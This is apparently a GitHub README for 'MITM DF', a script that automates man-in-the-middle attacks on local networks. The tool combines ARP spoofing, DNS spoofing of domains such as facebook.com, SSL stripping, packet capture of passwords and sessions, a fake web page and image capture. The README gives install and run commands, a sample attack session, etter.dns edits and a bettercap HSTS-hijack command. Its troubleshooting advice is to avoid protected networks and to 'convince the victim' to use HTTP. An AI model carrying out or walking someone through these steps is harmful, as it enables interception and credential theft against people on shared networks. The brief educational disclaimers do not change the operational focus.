# MITM-DF 
#آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم

# MITM DF - Man-In-The-Middle Attack Tool
**MITM DF** is a comprehensive and powerful tool designed to perform **Man-In-The-Middle** (MITM) attacks on local networks. It integrates multiple techniques such as **ARP Spoofing**, **DNS Spoofing**, and **SSL Stripping** to execute sophisticated attacks. This tool is intended for **educational purposes**, **security testing**, and **ethical hacking**. Unauthorized use is strictly prohibited.

---

## Features:
- **ARP Spoofing**: Redirects network traffic through the attacker's machine.
- **DNS Spoofing**: Forges DNS responses to redirect victims to malicious or fake websites.
- **SSL Stripping**: Downgrades HTTPS connections to HTTP to intercept unencrypted data.
- **Packet Capture**: Captures sensitive data such as passwords, cookies, and more.
- **Fake Web Server**: Hosts a fake webpage to deceive victims.
- **Image Capture**: Captures images transmitted over the network using **Driftnet**.
- **Logging**: Logs all intercepted traffic for later analysis.

---

## System Requirements:
- **Operating System**: Linux (preferably Kali Linux, Parrot OS, or any Debian-based distribution).
- **Permissions**: Root access is required to run the tool.
- **Dependencies**: 
  - `ettercap-text-only`
  - `sslstrip`
  - `iptables`
  - `nmap`
  - `dsniff`
  - `driftnet`
  - `bettercap`
  - `python3`
-------------------
## Tool features in brief:

---

## Features:

##You only need a Wi-Fi card or an external piece.. 

### 1. **ARP Spoofing**:
   - Redirects traffic between the victim and the router through your machine.
   - Allows you to intercept all passing data.

### 2. **DNS Spoofing**:
   - Changes the domain's IP address that the victim wants to access.
   - Allows you to redirect the victim to a fake website.

### 3. **SSL Stripping**:
   - Removes encryption from websites (HTTPS) and converts them to (HTTP).
   - Allows you to view data that was previously encrypted.

### 4. **Packet Capture**:
   - Captures passing data (e.g., passwords, sessions).
   - Data is saved in the `mitm_log.txt` file.

### 5. **Fake Web Server**:
   - Creates a fake webpage displayed to the victim.
   - Allows you to deceive the victim with a fake page.

### 6. **Image Capture**:
   - Captures images passing through the network.
   - Images are saved in the `~/Downloads/mitmdf_downloads` folder.

### 7. **Network Scanning**:
   - Detects all devices connected to the network.
   - Allows you to easily choose the target.

### 8. **IP Forwarding**:
   - Enables IP forwarding to facilitate the attack.
   - Redirects traffic through your machine.

### 9. **Easy to Use**:
   - You can install all required tools with one click using the `setup.sh` file included in the repository.

### 10. **Automatic Cleanup**:
    - When you press `Ctrl+C`, the tool stops the attack and resets settings to normal.

---

## Tool Interface When Running:

```plaintext
   M I T M  -  D F

Developer: @A_Y_TR
Telegram Channel: https://t.me/cybersecurityTemDF
Warning: This tool is for educational and security purposes only. Illegal use is prohibited!

[!] Enter 0 to uninstall tools or any other key to continue: 
Choice: 1

[+] Enabling IP Forwarding...
[✔] IP Forwarding enabled successfully!

[+] Detecting network interface and router IP...
[✔] Network Interface: eth0
[✔] Router IP: 192.168.1.1

[+] Scanning connected devices...
192.168.1.2
192.168.1.3
192.168.1.4
[!] Choose the target IP from the list above: 
Target IP: 192.168.1.2

[!] Enter the domain to spoof (e.g., facebook.com): 
Domain: facebook.com

[!] Enter the IP address to redirect to (e.g., 192.168.1.100): 
IP Address: 192.168.1.100

[!] Enter the fake URL to display (e.g., http://example.com): 
Fake URL: http://example.com

[+] Modifying etter.dns for DNS Spoofing...
[+] Starting ARP Spoofing on 192.168.1.2 ...
[+] Starting DNS Spoofing...
[+] Starting SSL Stripping with BetterCap...
[+] Starting Python HTTP Server to display fake page...
[+] Starting packet capture with tcpdump...
[+] Starting Driftnet to capture images...
[✔] Attack is running!
[!] Press Ctrl+C to stop the attack.
```
---



## Installation:

### Step 1: Clone the Repository
Clone the tool from the GitHub repository Of course, the installation commands contain everything we need for the purpose of precautions:
##First of all, I'm sorry for the repeated installation... but for security purposes only..!! 

```bash
git clone https://github.com/MohamedAbuAl-Saud/MITM-DF.git
cd MITM DF
sudo apt update
     sudo apt install -y ettercap-text-only sslstrip iptables nmap dsniff driftnet bettercap python3
chmod +x setup.sh
bash setup.sh
chmod +x mitmdf.sh
sudo ./mitmdf.sh
```

### Step 2: Make the Script Executable
Grant execute permissions to the script:
```bash
chmod +x mitmdf.sh
```

### Step 3: Run the Tool
Execute the tool with root privileges:
```bash
sudo ./mitmdf.sh
```

---

## Usage Instructions:

### Step 1: Launch the Tool
Run the tool as root:
```bash
sudo ./mitmdf.sh
```

### Step 2: Choose to Uninstall or Continue
The tool will prompt you to either uninstall or continue:
```
[!] Enter 0 to uninstall tools or any other key to continue: 
Choice: 1
```

### Step 3: Select Network Interface and Router IP
The tool will automatically detect the network interface and router IP. If not detected, ensure your network is properly configured.

### Step 4: Scan Connected Devices
The tool will scan the network for connected devices and display their IP addresses:
```
[+] Scanning connected devices...
192.168.1.2
192.168.1.3
192.168.1.4
[!] Choose the target IP from the list above: 
Target IP: 192.168.1.2
```

### Step 5: Enter Attack Parameters
You will be prompted to enter the following details:
- **Domain to Spoof**: The domain you want to spoof (e.g., `facebook.com`).
- **Redirect IP**: The IP address to which the victim will be redirected.
- **Fake URL**: The fake URL to display to the victim (e.g., `http://example.com`).

Example:
```
[!] Enter the domain to spoof (e.g., facebook.com): 
Domain: facebook.com
[!] Enter the IP address to redirect to (e.g., 192.168.1.100): 
IP Address: 192.168.1.100
[!] Enter the fake URL to display (e.g., http://example.com): 
Fake URL: http://example.com
```

### Step 6: Start the Attack
The tool will automatically start the attack using the provided parameters.

### Step 7: Stop the Attack
Press `Ctrl+C` to stop the attack and clean up the settings.

---

## Expected Issues and Solutions:

### 1. **Failed to Install Tools**:
   - **Cause**: Internet connection issues or outdated package lists.
   - **Solution**:
     ```bash
     sudo apt update
     sudo apt install -y ettercap-text-only sslstrip iptables nmap dsniff driftnet bettercap python3
     ```

### 2. **Failed to Enable IP Forwarding**:
   - **Cause**: System configuration issues.
   - **Solution**:
     ```bash
     echo 1 > /proc/sys/net/ipv4/ip_forward
     sysctl -w net.ipv4.ip_forward=1
     ```

### 3. **Network Interface or Router IP Not Detected**:
   - **Cause**: Incorrect network configuration.
   - **Solution**:
     ```bash
     ip a
     sudo systemctl restart networking
     ```

### 4. **ARP Spoofing Failure**:
   - **Cause**: Advanced network security measures like **Static ARP** or **ARP Inspection**.
   - **Solution**: Use the tool in a network without such security measures.

### 5. **SSL Stripping Failure**:
   - **Cause**: The victim is using **HTTPS Everywhere** or **HSTS**.
   - **Solution**: Convince the victim to visit an HTTP site instead.

---

## Usage Examples:

### Example 1: **Capturing Passwords**
- If the victim logs into an unencrypted (HTTP) website, their credentials will be captured in the `mitm_log.txt` file.

### Example 2: **Redirecting Traffic**
- If the victim tries to visit `facebook.com`, they will be redirected to a fake page hosted at `http://example.com`.

### Example 3: **Capturing Images**
- If the victim browses websites with images, these images will be saved in the `~/Downloads/mitmdf_downloads` folder.

### Example 4: **Testing Network Security**
- Use the tool to simulate an attack on your own network and identify vulnerabilities.

### Example 5: **Educational Demonstration**
- Demonstrate how MITM attacks work in a controlled environment to educate others about network security risks.

---

## Advanced Usage:

### Customizing etter.dns
You can manually edit the `/etc/ettercap/etter.dns` file to add more domains for DNS spoofing:
```bash
echo "example.com A 192.168.1.100" >> /etc/ettercap/etter.dns
echo "*.example.com A 192.168.1.100" >> /etc/ettercap/etter.dns
```

### Using BetterCap for Advanced Attacks
BetterCap can be used for more advanced attacks like **HSTS Bypass** or **Session Hijacking**:
```bash
bettercap -iface eth0 -caplet hstshijack/hstshijack
```

---

## Developer:
- **Developer**: [@A_Y_TR](https://t.me/A_Y_TR)
- **Telegram Channel**: [Cybersecurity TemDF](https://t.me/cybersecurityTemDF)

---

## Warning:
- **This tool is for educational and security purposes only**.
- **Unauthorized use is illegal and unethical**.
- **Ensure you have written permission before using it on any network**.

---
##Licensing: 

--- ## License: This project is licensed under the [MIT License](LICENSE). Permission is granted to use, modify, and distribute the tool for any purpose, including commercial purposes, provided that the original copyright notice and license statement are included in all copies or substantial portions of the program. See the [LICENSE](LICENSE) file for details. 
---
## Support:
For support or questions, contact the developer via [Telegram](https://t.me/A_Y_TR) or visit the [Telegram Channel](https://t.me/cybersecurityTemDF).
